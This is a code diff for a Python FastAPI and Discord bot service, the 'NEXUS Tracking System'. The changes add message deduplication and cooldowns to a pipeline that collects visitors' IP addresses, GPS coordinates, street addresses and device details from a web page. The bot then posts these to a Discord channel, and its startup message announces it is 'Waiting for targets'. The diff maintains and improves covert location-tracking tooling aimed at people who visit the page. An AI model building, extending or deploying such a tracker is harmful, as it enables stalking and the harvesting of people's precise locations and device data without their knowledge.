@@ -3,7 +3,7 @@ import json
 import asyncio
 import threading
 import math
-from datetime import datetime
+from datetime import datetime, timedelta
 from fastapi import FastAPI, Request
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import JSONResponse
@@ -18,6 +18,7 @@ import hashlib
 import time
 from queue import Queue
 from threading import Thread
+from collections import defaultdict
 
 load_dotenv()
 
@@ -53,10 +54,12 @@ class VisitorInfo(BaseModel):
     fragments: list = []
     button_presses: int = 0
 
-# ==================== SIMPLE STORAGE ====================
+# ==================== STORAGE WITH DEDUPLICATION ====================
 visitors = {}
 visits = []
 message_queue = Queue()
+sent_message_ids = set()  # Track sent message IDs to prevent duplicates
+last_visitor_update = {}  # Track last update time per user
 
 # ==================== FASTAPI SETUP ====================
 app = FastAPI(title="NEXUS Tracking System")
@@ -79,21 +82,64 @@ class NexusBot(commands.Bot):
         self.channel = None
         self.ready = False
         self.message_queue = Queue()
+        self.last_messages = defaultdict(dict)  # Track last message per type per user
+        self.message_cooldown = 5  # Cooldown in seconds for same message type
 
     async def setup_hook(self):
         await self.tree.sync()
         print("✅ Slash commands synced")
 
+    def should_send_message(self, user_id: str, msg_type: str, content_hash: str) -> bool:
+        """Check if we should send this message (deduplication logic)"""
+        now = time.time()
+        
+        # Check if we've sent this exact content recently
+        if user_id in self.last_messages:
+            if msg_type in self.last_messages[user_id]:
+                last_sent = self.last_messages[user_id][msg_type]
+                # Don't send same message type within cooldown
+                if now - last_sent['time'] < self.message_cooldown:
+                    # If it's the exact same content, definitely skip
+                    if last_sent.get('hash') == content_hash:
+                        return False
+                    # If it's within cooldown but different content, still wait
+                    return False
+        
+        return True
+
+    def record_message_sent(self, user_id: str, msg_type: str, content_hash: str):
+        """Record that we sent a message"""
+        self.last_messages[user_id][msg_type] = {
+            'time': time.time(),
+            'hash': content_hash
+        }
+
     async def process_queue(self):
-        """Process messages from the queue"""
+        """Process messages from the queue with deduplication"""
         while True:
             if not self.message_queue.empty():
                 msg = self.message_queue.get()
                 try:
                     if msg['type'] == 'embed' and self.channel:
-                        await self.channel.send(embed=msg['data'])
+                        embed = msg['data']
+                        user_id = msg.get('user_id', 'unknown')
+                        
+                        # Create a content hash for deduplication
+                        content_hash = hashlib.md5(
+                            f"{embed.title}{embed.description}{len(embed.fields)}".encode()
+                        ).hexdigest()
+                        
+                        # Check if we should send this message
+                        if self.should_send_message(user_id, msg['subtype'], content_hash):
+                            await self.channel.send(embed=embed)
+                            self.record_message_sent(user_id, msg['subtype'], content_hash)
+                            print(f"✅ Sent {msg['subtype']} for user {user_id[:8]}")
+                        else:
+                            print(f"⏭️ Skipped duplicate {msg['subtype']} for user {user_id[:8]}")
+                            
                     elif msg['type'] == 'content' and self.channel:
                         await self.channel.send(content=msg['data'])
+                        
                 except Exception as e:
                     print(f"❌ Queue send error: {e}")
             await asyncio.sleep(0.1)
@@ -117,18 +163,22 @@ async def on_ready():
         # Start queue processor
         asyncio.create_task(bot.process_queue())
         
-        embed = Embed(
-            title="🔮 NEXUS SYSTEM ONLINE",
-            description="```Tracking system activated\nWaiting for targets...```",
-            color=Color.green(),
-            timestamp=datetime.now()
-        )
-        embed.add_field(name="Status", value="✅ Active", inline=True)
-        embed.add_field(name="Channel", value=f"#{bot.channel.name}", inline=True)
-        embed.add_field(name="Frontend", value=f"[Website]({FRONTEND_URL})", inline=True)
-        
-        await bot.channel.send(embed=embed)
-        print("✅ Startup message sent")
+        # Only send startup message if not sent recently
+        startup_hash = hashlib.md5(b"startup").hexdigest()
+        if bot.should_send_message("system", "startup", startup_hash):
+            embed = Embed(
+                title="🔮 NEXUS SYSTEM ONLINE",
+                description="```Tracking system activated\nWaiting for targets...```",
+                color=Color.green(),
+                timestamp=datetime.now()
+            )
+            embed.add_field(name="Status", value="✅ Active", inline=True)
+            embed.add_field(name="Channel", value=f"#{bot.channel.name}", inline=True)
+            embed.add_field(name="Frontend", value=f"[Website]({FRONTEND_URL})", inline=True)
+            
+            await bot.channel.send(embed=embed)
+            bot.record_message_sent("system", "startup", startup_hash)
+            print("✅ Startup message sent")
         
     except Exception as e:
         print(f'❌ Error: {e}')
@@ -452,58 +502,116 @@ async def submit_visitor(request: Request, visitor: VisitorInfo):
             'data': data
         })
         
-        # Queue messages for Discord (non-blocking)
+        # Queue messages for Discord with deduplication (non-blocking)
         if bot.ready and bot.channel:
-            # Queue new visitor embed
+            # Queue new visitor embed (only if new)
             if is_new:
                 embed = create_new_visitor_embed(user_id, data, client_ip)
                 if embed:
-                    bot.message_queue.put({'type': 'embed', 'data': embed})
+                    bot.message_queue.put({
+                        'type': 'embed', 
+                        'subtype': 'new_visitor',
+                        'user_id': user_id,
+                        'data': embed
+                    })
             
-            # Queue location and satellite embeds
+            # Queue location and satellite embeds (only if coordinates exist and not sent recently)
             if data.get('coordinates'):
+                # Only send location embed if not sent in last 30 seconds for this user
                 loc_embed = create_location_embed(user_id, data, client_ip)
                 if loc_embed:
-                    bot.message_queue.put({'type': 'embed', 'data': loc_embed})
+                    bot.message_queue.put({
+                        'type': 'embed', 
+                        'subtype': 'location',
+                        'user_id': user_id,
+                        'data': loc_embed
+                    })
                 
                 sat_embed = create_satellite_embed(user_id, data)
                 if sat_embed:
-                    bot.message_queue.put({'type': 'embed', 'data': sat_embed})
+                    bot.message_queue.put({
+                        'type': 'embed', 
+                        'subtype': 'satellite',
+                        'user_id': user_id,
+                        'data': sat_embed
+                    })
             
-            # Queue system embed
-            if data.get('system'):
+            # Queue system embed (only once per session)
+            if data.get('system') and is_new:
                 sys_embed = create_system_embed(user_id, data, client_ip)
                 if sys_embed:
-                    bot.message_queue.put({'type': 'embed', 'data': sys_embed})
+                    bot.message_queue.put({
+                        'type': 'embed', 
+                        'subtype': 'system',
+                        'user_id': user_id,
+                        'data': sys_embed
+                    })
             
-            # Queue button press embeds
+            # Queue button press embeds (only if button presses increased)
             if data.get('button_presses', 0) > 0:
-                btn_embed = create_button_embed(user_id, data.get('button_presses'), client_ip)
-                if btn_embed:
-                    bot.message_queue.put({'type': 'embed', 'data': btn_embed})
+                # Check if button press count increased
+                last_presses = last_visitor_update.get(user_id, {}).get('button_presses', 0)
+                if data.get('button_presses') > last_presses:
+                    btn_embed = create_button_embed(user_id, data.get('button_presses'), client_ip)
+                    if btn_embed:
+                        bot.message_queue.put({
+                            'type': 'embed', 
+                            'subtype': 'button',
+                            'user_id': user_id,
+                            'data': btn_embed
+                        })
             
-            # Queue fragment embeds
+            # Queue fragment embeds (only for new fragments)
             fragments = data.get('fragments', [])
             if fragments:
-                for fragment in fragments:
+                last_fragments = last_visitor_update.get(user_id, {}).get('fragments', [])
+                new_fragments = [f for f in fragments if f not in last_fragments]
+                
+                for fragment in new_fragments:
                     frag_embed = create_fragment_embed(user_id, fragment, len(fragments), client_ip)
                     if frag_embed:
-                        bot.message_queue.put({'type': 'embed', 'data': frag_embed})
+                        bot.message_queue.put({
+                            'type': 'embed', 
+                            'subtype': 'fragment',
+                            'user_id': user_id,
+                            'data': frag_embed
+                        })
             
-            # Queue summary embed
-            summary_embed = create_summary_embed(user_id, data, client_ip)
-            if summary_embed:
-                bot.message_queue.put({'type': 'embed', 'data': summary_embed})
+            # Queue summary embed (only if something changed)
+            last_update = last_visitor_update.get(user_id, {})
             
-            print(f"✅ Queued {bot.message_queue.qsize()} messages for Discord")
+            # Check if anything changed
+            changed = (
+                data.get('button_presses', 0) != last_update.get('button_presses', 0) or
+                len(data.get('fragments', [])) != len(last_update.get('fragments', [])) or
+                is_new
+            )
+            
+            if changed:
+                summary_embed = create_summary_embed(user_id, data, client_ip)
+                if summary_embed:
+                    bot.message_queue.put({
+                        'type': 'embed', 
+                        'subtype': 'summary',
+                        'user_id': user_id,
+                        'data': summary_embed
+                    })
+            
+            # Update last visitor data
+            last_visitor_update[user_id] = {
+                'button_presses': data.get('button_presses', 0),
+                'fragments': data.get('fragments', []),
+                'timestamp': time.time()
+            }
+            
+            print(f"✅ Queued messages for user {user_id[:8]}")
         else:
-            print(f"⚠️ Bot not ready - messages queued locally")
+            print(f"⚠️ Bot not ready - skipping Discord messages")
         
         return JSONResponse({
             "status": "success", 
             "user_id": user_id, 
-            "is_new": is_new,
-            "queued": bot.message_queue.qsize()
+            "is_new": is_new
         })
         
     except Exception as e:
@@ -541,22 +649,28 @@ async def stats(interaction: discord.Interaction):
 async def recent(interaction: discord.Interaction, limit: int = 5):
     await interaction.response.defer()
     
-    locations = []
-    for visit in reversed(visits):
-        if visit['data'].get('coordinates') and len(locations) < limit:
-            locations.append(visit)
+    # Deduplicate by user_id and only show most recent per user
+    seen_users = set()
+    unique_locations = []
     
-    if not locations:
+    for visit in reversed(visits):
+        if visit['user_id'] not in seen_users and visit['data'].get('coordinates'):
+            seen_users.add(visit['user_id'])
+            unique_locations.append(visit)
+            if len(unique_locations) >= limit:
+                break
+    
+    if not unique_locations:
         await interaction.followup.send("No locations found")
         return
     
     embed = Embed(
-        title=f"📍 RECENT LOCATIONS (Last {len(locations)})",
+        title=f"📍 RECENT LOCATIONS (Last {len(unique_locations)} unique users)",
         color=Color.blue(),
         timestamp=datetime.now()
     )
     
-    for loc in locations:
+    for loc in unique_locations:
         coords = loc['data'].get('coordinates', {})
         addr = loc['data'].get('address', {})
         
@@ -587,13 +701,13 @@ async def help_command(interaction: discord.Interaction):
     
     commands = [
         "`/stats` - View tracking statistics",
-        "`/recent [limit]` - Show recent locations",
+        "`/recent [limit]` - Show recent locations (deduplicated)",
         "`/queue` - Show message queue status",
         "`/help` - Show this message"
     ]
     
     embed.add_field(name="Commands", value="\n".join(commands), inline=False)
-    embed.set_footer(text="NEXUS Tracking System v2.0")
+    embed.set_footer(text="NEXUS Tracking System v2.1 - With deduplication")
     
     await interaction.response.send_message(embed=embed)
 
